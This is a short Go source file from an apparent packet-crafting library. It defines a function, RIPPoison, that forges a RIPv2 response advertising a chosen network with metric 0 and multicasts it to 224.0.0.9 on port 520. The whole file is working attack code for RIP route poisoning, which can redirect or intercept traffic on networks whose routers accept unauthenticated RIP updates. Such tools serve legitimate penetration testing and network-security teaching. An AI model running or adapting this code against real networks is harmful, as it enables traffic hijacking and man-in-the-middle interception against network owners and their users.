package higherlevel

import (
	"github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"net"
)

func RIPPoison(network, subnet_mask, iface string) {
	ethLayer := packet.EthernetLayer()
	ethLayer.SetSrcMAC(utils.MacByInt(iface))
	ethLayer.SetEthernetType(layers.EthernetTypeIPv4)

	ipLayer := packet.IPv4Layer()
	ipLayer.SetSrcIP(utils.IPbyInt(iface))
	ipLayer.SetDstIP("224.0.0.9")
	ipLayer.SetProtocol(layers.IPProtocolUDP)

	udpLayer := packet.UDPLayer()
	udpLayer.SetSrcPort("520")
	udpLayer.SetDstPort("520")
	udpLayer.Layer().SetNetworkLayerForChecksum(ipLayer.Layer())

	ripLayer := packet.RIPLayer()
	ripLayer.SetCommand(2)
	ripLayer.SetVersion(2)
	ripLayer.AddEntry(2, 0, net.ParseIP(network), net.ParseIP(subnet_mask), net.ParseIP("0.0.0.0"), 0)

	pkt, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), udpLayer.Layer(), ripLayer.Layer())
	communication.Send(pkt, iface)
}
